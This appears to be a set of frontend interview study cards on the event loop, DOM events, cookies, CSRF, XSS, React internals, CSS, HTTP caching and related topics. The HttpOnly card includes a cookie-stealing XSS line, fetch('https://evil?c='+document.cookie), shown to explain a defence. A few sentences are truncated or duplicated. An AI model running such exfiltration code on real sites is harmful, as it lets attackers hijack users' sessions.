title: The stack runs. Then the queue.
lede: JS is one stack. A call runs to completion. When the stack is empty, the event loop takes a task from the queue (click, timer, I/O). Rendering is its own turn after microtasks. This is why a busy loop freezes the page.
diagram: 1 stack: main → foo → bar. 2 bar returns, stack empty. 3 queue: click, setTimeout 0. Loop picks click, then timer. Caption: the stack never runs two functions at once. Web Workers are other stacks.
what: Run-to-completion + a queue. The queue cannot interrupt the stack. Microtasks (plate 227) sit in front of the next macrotask.
why: ‘Why did my timeout fire late?’ The stack was busy. Interviews: draw stack vs queue vs render.
trap: ‘JS is multithreaded.’ setTimeout(0) is not next-line — it is next macrotask. A while(true) starves clicks, timers, and paint.

title: Promises drain before timers.
lede: A resolved promise .then (and queueMicrotask, MutationObserver) is a microtask. setTimeout, setInterval, I/O, events are macrotasks. After every stack, the engine drains the entire microtask queue before the next macrotask or paint.
diagram: Left (hit): console 1; Promise.then 2; setTimeout 3 → prints 1,2,3. Right: a then that queues another then still runs before the timer. Caption: await after the first line is a microtask. fetch’s callback is a macrotask wrapping a microtask.
what: Macrotask: one per turn. Microtasks: all of them, including ones scheduled during the drain. Then render may happen.
why: The classic interview order question. Also: a tight promise loop can starve paint just like a busy stack.
trap: Assuming setTimeout(0) beats Promise.then. Recursing promises until the tab janks. Mixing Node nextTick (micro) with setImmediate (macro) as if they were the same.

title: Capture down. Bubble up.
lede: A click on a child walks the tree twice. Capture: window → … → target (listeners with capture:true). Target. Bubble: target → … → window (default). Most code listens on bubble. The order is the whole trick.
diagram: 1 html > form > button. Click button. 2 capture: html, form, button. 3 bubble: button, form, html. Caption: addEventListener(type, fn, true) is capture. Third arg false/omit is bubble. React 17+ delegates to the root, still bubble order for your handlers.
what: Three phases, one event object. target is the origin; currentTarget is the listener’s node.
why: Modals, menus, ‘click outside.’ You pick the phase so a parent can run before or after the child.
trap: Binding capture and wondering why the parent ran first. onclick= only bubbles. stopPropagation in capture so the child never hears it — surprise.

title: preventDefault is not stopPropagation.
lede: preventDefault stops the browser’s built-in action (navigate, check, submit, type). stopPropagation stops the event from reaching other nodes. You can cancel the default and still bubble. You can stop travel and still submit. They are independent.
diagram: Left: <a> click preventDefault — no navigation, parent still hears the click. Right: stopPropagation on the button — form’s listener never runs; the submit default might still fire if you didn’t prevent it. Caption: return false in old onclick does both. In addEventListener it does neither unless you call them.
what: Default = the UA behavior. Propagation = other listeners. stopImmediatePropagation also blocks later listeners on the same node.
why: Forms, links, drag, contenteditable. Interviews mix the two names on purpose.
trap: stopPropagation to ‘cancel the link.’ Using return false in an addEventListener handler. React: e.preventDefault() on a div thinking it stops a nested button.

title: One listener. Many children.
lede: A thousand rows do not need a thousand click handlers. Listen on the parent. In the handler, event.target (or closest) tells you which child was hit. New rows are free — they bubble. This is delegation.
diagram: Left (bad): rows.forEach → addEventListener. Memory, and rows added later are deaf. Right (hit): table.addEventListener('click', e => { const tr = e.target.closest('tr'); if (!table.contains(tr)) return; … }). Caption: closest walks up. Matches dynamically added nodes. React: onClick on the list, data-id on the item.
what: One bubble listener on an ancestor. Filter by selector. Cheap for big lists. Capture delegation exists but is rare.
why: Tables, menus, infinite scroll. Also why React can attach one listener at the root.
trap: e.target is a nested <span> inside the row — use closest, not ==. Parent listener + child stopPropagation so the parent never sees it. Delegating ‘mouseenter’ (does not bubble).

title: Cookies travel. Storage stays.
lede: A cookie is sent on matching HTTP requests — that is the point and the cost. localStorage stays in the origin; the server never sees it unless you copy it. sessionStorage dies with the tab. Session vs auth: if the server must receive it, it is a cookie (or a header you set).
diagram: Box1 Cookie — Cookie: sid=… on every GET /api. 4KB, sent. Box2 localStorage — origin, 5MB+, no auto send. Box3 sessionStorage — per tab. Caption: JWT in localStorage is XSS-bait (plate 234). Cookie with httpOnly (plate 232) is the session default.
what: Cookie = request-scoped credentials. Web storage = client cache. IndexedDB is structured and async.
why: ‘Where do I put the token?’ If the API needs it, prefer a cookie. If it is a draft document, storage.
trap: Auth JWT in localStorage. Stuffing 4KB of prefs into cookies so every image request carries them. Assuming sessionStorage survives a new tab.

title: httpOnly means JS cannot read it.
lede: Set-Cookie: sid=…; HttpOnly. The browser stores it and sends it. document.cookie cannot see it. XSS can still run as you, but it cannot exfiltrate that cookie via JS. It can still do-as-you (CSRF — plates 30, 233).
diagram: Left (bad): document.cookie includes sid. XSS: fetch('https://evil?c='+document.cookie). Right (hit): HttpOnly; document.cookie is ‘theme=dark’. XSS cannot read sid; it can still POST /transfer if CSRF isn’t blocked. Caption: Server sets HttpOnly. Frontend cannot add it to a cookie it created in JS for the session.
what: HttpOnly is a flag on the cookie, not a JS API. Pair with Secure (HTTPS) and SameSite (plate 233).
why: Session cookies. Defense in depth against XSS, not a substitute for sanitizing HTML (plate 234).
trap: Reading the session from document.cookie in SPA code — then you cannot use HttpOnly. Putting the access token in memory ‘so XSS can’t get it’ and the refresh token in localStorage.

title: SameSite is the CSRF cookie.
lede: CSRF is the other site’s form hitting yours with the user’s cookies (plate 30). SameSite tells the browser when to attach the cookie on cross-site requests. Lax (default): sent on top-level GET navigations, not on cross-site POST/fetch. Strict: never cross-site. None: always, and it must be Secure.
diagram: Box1 Strict — no cookie on any cross-site, including clicking a link to you. Box2 Lax — link GET has cookie; evil POST does not. Box3 None; Secure — needed for cross-site iframes / APIs, CSRF tokens still required. Caption: ‘site’ is eTLD+1 (foo.com), not origin (app.foo.com vs bar.foo.com is same-site).
what: Same-site ≠ same-origin. Lax is the CSRF seatbelt for cookie sessions. Cross-subdomain apps are same-site.
why: Modern CSRF. A token is still wise for None and for extra-sensitive POST.
trap: SameSite=None without Secure — rejected. Thinking Lax blocks a GET /delete?id= from an — Lax sends cookies on top-level GET, not on subresource GET. Cross-site fetch from SPA to api.other.com needs None or no cookies (Authorization header).

title: XSS is their script on your origin.
lede: Cross-site scripting: attacker-controlled text is parsed as HTML/JS in your origin. Then it is your cookies, your storage, your user’s session (plate 9). The fix is treat untrusted strings as text: textContent, not innerHTML; encode on the way out; Content-Security-Policy as a net.
diagram: Left (bad): el.innerHTML = comment; comment is . Right (hit): el.textContent = comment; or a sanitizer that drops script/on*. Caption: React JSX texts by default; dangerouslySetInnerHTML is the hole. href={'javascript:…'} is XSS too.
what: Stored, reflected, DOM-based — same payload class. CSP script-src + nonce makes injected tags inert if you did everything else sloppy.
why: Frontend security interview #1. Pair with HttpOnly (plate 232) so a residual XSS cannot lift the session cookie.
trap: Sanitize on input, render with innerHTML later after a ‘safe’ markdown path. Blacklisting <script> and missing onerror. Trusting JSON in a <script> tag without escaping <.

title: Hydration must match the HTML.
lede: SSR sends HTML. Hydration attaches React (or Vue) to those nodes. The client tree must equal the server tree — same text, same tag, same number of children. A mismatch throws away the DOM and rebuilds, or warns and patches. Date.now(), random, and locale in render are the usual bombs.
diagram: Left (bad): server ‘Good morning’, client after 11:00 ‘Good afternoon’ — checksum fail. Right (hit): render a stable placeholder; read time in useEffect. Caption: suppressHydrationWarning is a scalpel for the clock, not a license. Streaming SSR still hydrates islands.
what: First client render = server HTML. Effects run after hydrate. Data that differs per request belongs in the HTML the server already computed.
why: Next/Remix interviews. ‘Why does SSR flash?’ is often a hydrate mismatch or a client-only branch.
trap: if (typeof window) in render. Math.random() as a key. Invalid HTML (p inside p) that the browser rewrote before React saw it.

title: Fiber walks. Keys name the nodes.
lede: React’s Fiber is a linked tree of work units. On update it walks, diffs type+key, and reuses the fiber when they match (plate 26). Keys are identity in a list, not an index if the list reorders. The walk can pause (concurrent) — that is time-slicing, not a second thread.
diagram: 1 [a,b,c] keys a,b,c. 2 insert x at 0 with keys x,a,b,c — a,b,c reuse. 3 same insert with index keys 0,1,2,3 — every child looks new, state jumps. Caption: type change (div→span) always remounts. State lives on the fiber, not the DOM node.
what: Diff is type and key, not ‘deep equal the world.’ Index keys are stable only for append-only static lists.
why: The real reason keys exist. Also: remounting resets state and effects — sometimes you want that (key={id} on a form).
trap: key={Math.random()} every render. key={index} on a sortable list. Putting the key on the inner <div> instead of the array element.

title: memo loses if the object is new.
lede: React.memo (and useMemo, useCallback) skip work when props are Object.is-equal to last time. Inline {} and () => {} are new every render. The child memoizes nothing. Wrap the value, or don’t memo — measure first.
diagram: Left (bad): <Item style={{color}} onClick={() => save(id)} /> inside a list — memo(Item) always renders. Right (hit): style cached in useMemo, onClick from useCallback([id]) or an id on the row + parent handler (plate 230). Caption: context value={{user}} has the same bug for every consumer.
what: Shallow ref equality. memo is not ‘make it fast’; it is ‘skip if the refs match.’ Primitive props are free.
why: Premature memo is noise. Accidental new objects are why a ‘optimized’ tree still renders.
trap: memo everywhere. Spreading ...props so a new object always arrives. useMemo with empty deps on a value that should update.

title: Context is a broadcast, not a store.
lede: A context Provider re-renders every consumer when its value ref changes. It is how to avoid prop drilling, not a replacement for Redux/Zustand. Split contexts (user vs theme). Put the changing value in a store and subscribe narrowly if many fields churn.
diagram: Left (bad): one AppContext with {user, theme, cart, dispatch} — a tick in cart rerenders the header theme reader. Right (hit): ThemeContext stable, CartContext separate, or a selector subscription. Caption: value={{user}} without useMemo is a new object every parent render (plate 237).
what: Broadcast + ref equality. Default context is the value when no Provider exists.
why: Why ‘I put it in context’ still janks. Interviews: when context vs props vs a store.
trap: One giant context. Provider inside a component that renders often. Consumers that only need dispatch but still rerender because dispatch was inlined.

title: Controlled means React owns the value.
lede: Controlled input: value={state} onChange={set}. React is the source of truth; the DOM is a mirror. Uncontrolled: defaultValue + a ref; the DOM owns it until you read. Mixing value without onChange freezes the field.
diagram: Left (hit): value={name} onChange={e => setName(e.target.value)} — every keystroke a render. Right: defaultValue="ada" ref={r}; submit reads r.current.value. Caption: file inputs are uncontrolled by spec. Checkboxes use checked, not value.
what: Controlled = one-way data. Uncontrolled = native until you ask. Forms libraries pick a side.
why: The ‘input doesn’t type’ bug is a value with no setter. Also: cursor jumping from async setState on each letter.
trap: value={x} and no onChange. Switching from uncontrolled to controlled mid-life (warning). Using defaultValue and value together.

title: Suspense is a pause, not a spinner.
lede: Suspense is a boundary: if a child isn’t ready, React renders fallback and tries again when the data (or code) resolves. The child ‘throws’ a promise (or uses a framework hook that does). It is not <Spinner/> you mount yourself. Code-split (lazy) and streaming SSR both sit on it.
diagram: 1 lazy(() => import('./Chart')). 2 <Suspense fallback={…}><Chart/></Suspense>. 3 first paint: fallback. 4 module loads, Chart commits. Caption: data Suspense needs a cache that the child reads. Waterfall: two siblings that each suspend, unless you prefetch.
what: A boundary around async UI. Fallback is the placeholder. Errors belong in an error boundary, not Suspense.
why: React 18 interviews. ‘How does lazy work?’ is this plate.
trap: Suspense around the whole app — one slow widget blanks everything. Using it as a loading boolean. No error boundary so a failed fetch is an uncaught throw.

title: Read layout. Then write. Not both.
lede: offsetWidth, getBoundingClientRect, scrollTop force layout. Then setting style.width dirties it. Interleaving reads and writes in a loop = layout thrash: the engine recomputes geometry N times per frame. Batch reads, then writes. rAF is the frame clock.
diagram: Left (bad): for each el: h = el.offsetHeight; el.style.height = h+1 + 'px' — N reflows. Right (hit): const hs = els.map(e => e.offsetHeight); then write all. Caption: plate 25 is the pipeline (layout → paint → composite). This is how you don’t explode it.
what: Layout is a snapshot. Invalidate with writes. One snapshot per frame if you can. Transform/opacity skip layout (composite only).
why: Jank interviews. 60fps is 16ms; one forced reflow on a big DOM can eat it.
trap: Reading layout inside a resize observer that then writes, that then reads. Animating top/left instead of transform. console.log(el.offsetHeight) in a hot path.

title: Specificity is a score.
lede: When two rules match, CSS picks the higher specificity, then source order. Score is (inline, IDs, classes/attrs/pseudos, types/elements). 0,1,0,0 beats 0,0,10,0. !important is a separate layer above — a surrender, not a strategy.
diagram: 1 #nav a  → 0,1,0,1. 2 .nav .link → 0,0,2,0. ID wins. 3 equal spec: later rule wins. Caption: style="" is 1,0,0,0. :not() does not add; its argument does. Layers (@layer) sit under unlayered.
what: A four-tuple, not ‘more classes always win.’ Inheritance is not specificity — it loses to a direct match of 0,0,0,0.
why: ‘Why won’t it change color?’ Usually an ID or inline somewhere.
trap: Fighting with !important. Counting selectors by length. Thinking a later stylesheet always wins across IDs.

title: A stacking context is a new z-world.
lede: z-index only compares siblings inside the same stacking context. A new context is created by position+z-index, opacity < 1, transform, filter, isolation, and a few more. A child with z-index:9999 cannot paint above an uncle if its parent is a lower context.
diagram: Left (trap): parent opacity:0.99; child z-index:9999; sibling of parent z-index:1 — sibling can cover the child. Right: isolate the modal as its own top context (z-index on the overlay root). Caption: transform:translateZ(0) for ‘GPU’ accidentally creates a context.
what: z-index is local. The parent’s context is a ceiling. Fixed/sticky also interact with contexts.
why: Dropdowns clipped under a header, modals under a toast. Draw the contexts, not the numbers.
trap: z-index:99999 on a nested node. opacity on a wrapper ‘for a fade’ trapping the menu. Mixing stacking with overflow:hidden clipping.

title: Cache-Control is permission to keep it.
lede: The browser (and CDN) may reuse a response only as the headers allow. max-age is seconds. no-store means do not write it. private is browser-only, not shared CDN. no-cache means revalidate before use, not ‘never cache.’
diagram: Box1 max-age=31536000, immutable — hashed assets. Box2 no-store — bank HTML. Box3 no-cache + ETag (plate 245) — HTML you may hold but must ask. Caption: meta tags are not Cache-Control. Service workers (plate 246) can override.
what: Freshness vs revalidation vs forbidden. HTML usually revalidates; content-hashed JS/CSS can live a year.
why: ‘Users see old app’ after deploy: HTML was cached, or the JS URL didn’t change.
trap: no-cache as if it were no-store. Caching /index.html for a week. Putting max-age on a JSON API that includes the current user.

title: ETag asks: has this changed?
lede: ETag is a version token for a representation. The client sends If-None-Match. If it still matches, 304 Not Modified — no body (plate 281). Weak ETags (W/) compare semantic equality. Last-Modified / If-Modified-Since is the date cousin.
diagram: 1 GET /app.js → 200 ETag: "abc". 2 next: If-None-Match: "abc". 3 304, cache keeps bytes. Caption: pair with Cache-Control: no-cache so it stores but revalidates. Must-revalidate on money pages.
what: Validator + conditional GET. 304 is success with an empty body. The cache already has the bytes.
why: Fast reloads, CDNs, APIs with big JSON. Cheaper than max-age when content changes often.
trap: New ETag every response (timestamp) — 304 never hits. Gzip changing ETag vs identity. Ignoring 304 and parsing an empty body as JSON.

title: A service worker is a proxy in the browser.
lead: A service worker is a proxy
lede: A service worker sits between the page and the network. It can intercept fetch, answer from Cache Storage, or go to the network. It is a separate thread, HTTPS-only, and it can outlive the tab. That is offline, and also a way to serve yesterday’s app.
diagram: 1 register sw.js. 2 install: cache.addAll(shell). 3 fetch event: cache.match or fetch. Caption: skipWaiting + clients.claim for updates. Precache hashed assets; network-first for HTML.
what: Programmable cache + fetch interceptor. Not a Web Worker for math. Scope is the path it was served from.
why: PWA, offline, ‘why is my deploy not showing.’ Version the cache name.
trap: Cache-first on index.html forever. No update story. Assuming it runs on http://localhost only — localhost is secure; http://192.168 is not.

title: The URL is a state, not always a file.
lede: An SPA changes the path with history.pushState and renders a component. The server still must answer that path on refresh — same HTML shell, or real SSR (plate 28). Hash routes (#/app) never hit the server. Search params are state you can share.
diagram: Left (bad): pushState /settings, refresh, 404 from nginx. Right (hit): nginx try_files $uri /index.html; or SSR the route. Caption: back button is popstate. ReplaceState for query tweaks you don’t want in history.
what: Client router + a server fallback. Deep links are a server problem.
why: The classic SPA refresh 404. Interviews: how routing works with a CDN.
trap: Ignoring refresh. pushState in a loop. Putting secrets in the query string (logs, Referer).

title: await is then, with a stack.
lede: async function always returns a Promise. await p pauses that function, schedules a microtask (plate 227) with the result, and throws on reject — try/catch works. It is .then/.catch with nicer stacks, not a thread. Sequential awaits wait; Promise.all overlaps.
diagram: Left: await a(); await b(); total ta+tb. Right (hit): const [a,b] = await Promise.all([a(), b()]). Caption: forEach(async x => await f(x)) does not wait — map + Promise.all does. Unhandled rejection is a throw you didn’t catch.
what: Syntax on Promises. Errors become rejections. The function after await is a new turn of the loop.
why: The ‘it returned before the fetch finished’ confusion. Also: accidental serial waterfalls.
trap: await in a loop for independent I/O. async forEach. Catching nothing so a 500 becomes Unhandled Promise Rejection.

title: this is the caller, unless you bind it.
lede: In a function (not arrow), this is set by the call site: obj.fn() → obj, fn() → undefined in strict (global in sloppy), new fn() → the instance, fn.call(x). Arrow functions close over this from the room they were born in (plate 23). They have no own this.
diagram: Box1 obj.fn() — this is obj. Box2 const f = obj.fn; f() — lost. Box3 arrow in a class field — this is the instance, even as a callback. Caption: bind(this) returns a new function. React class methods needed bind or arrows; function components don’t use this.
what: Call-site this vs lexical this. Losing this on extract is the bug.
why: Classic JS interview. Event listeners and map callbacks are where it falls off.
trap: Arrow on a prototype method you wanted to be overridable with its own this. Binding in render every time (new function, plate 237).

title: ESM is static. CJS is now.
lede: import/export is hoisted and statically analyzable — tree-shaking, circular bindings as live views. require is a function you call whenever — the value is a snapshot of module.exports at that line. Bundlers fake ESM on top of files. Node: .mjs / "type":"module" vs .cjs.
diagram: Left (hit): import { x } from './a' — graph known before run. Right: const x = require('./a') inside an if — graph depends on runtime. Caption: live ESM binding: a.js increments x, b.js sees the new x. CJS copy does not.
what: Static graph vs dynamic load. import() is the async escape hatch (returns a Promise).
why: ‘Why can’t I require an ESM package?’ Dual packages, or import(). Also: circular deps behave differently.
trap: Destructure CJS and expect live updates. Mixing default export interop (module.exports = fn vs export default). Circular ESM that reads a binding before init (TDZ).

title: A leak is a listener you never remove.
lede: In an SPA the page never unloads. A window listener, a setInterval, a subscription, a closure over a big DOM node — they live until you cut them. useEffect’s return is the cut. Navigate away without cleanup and you duplicate listeners or retain the old tree.
diagram: 1 useEffect(() => { const id = setInterval(…); window.addEventListener('resize', onR); return () => { clearInterval(id); window.removeEventListener('resize', onR); }; }, []). 2 same function reference for remove. Caption: removeEventListener needs the same fn. AbortController for fetch.
what: Cleanup mirrors setup. Detached DOM + a listener is a leak. Closures hold the fiber’s props.
why: SPAs don’t get the free GC of a full navigation (plate 70). Slow after 20 route changes.
trap: addEventListener in render. remove with a different arrow. setInterval without clear. Subscribing to a store in effect with no unsubscribe.
